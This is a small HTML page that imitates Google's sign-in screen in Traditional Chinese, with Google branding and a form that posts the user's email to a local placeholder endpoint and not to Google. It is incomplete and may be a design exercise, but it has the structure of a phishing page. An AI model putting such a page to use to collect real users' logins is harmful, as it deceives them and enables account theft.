<!DOCTYPE html>
<html lang="zh">
<head>
    <meta charset="UTF-8">
    <title>Google 登錄</title>
    <link rel="stylesheet" href="/css/styles.css">
</head>
<body>
    <div class="container">
        <div class="login-form">
            <div class="logo"><img src="https://cdn4.iconfinder.com/data/icons/logos-brands-7/512/google_logo-google_icongoogle-1024.png" alt="Google logo"></div>
            <div class="title">登入</div>
            <div class="subtitle">使用您的 Google 帳戶</div>
            <form id="login-form" action="/submit-your-login-form" method="post">
                <input type="email" id="email" name="email" placeholder="電子郵件或電話號碼">
                <input type="submit" id="next-button" value="下一步">
            </form>
            <div class="footer"><a href="#">創建帳號</a></div>
        </div>
    </div>
    <script src="/js/script.js"></script>
</body>
</html>
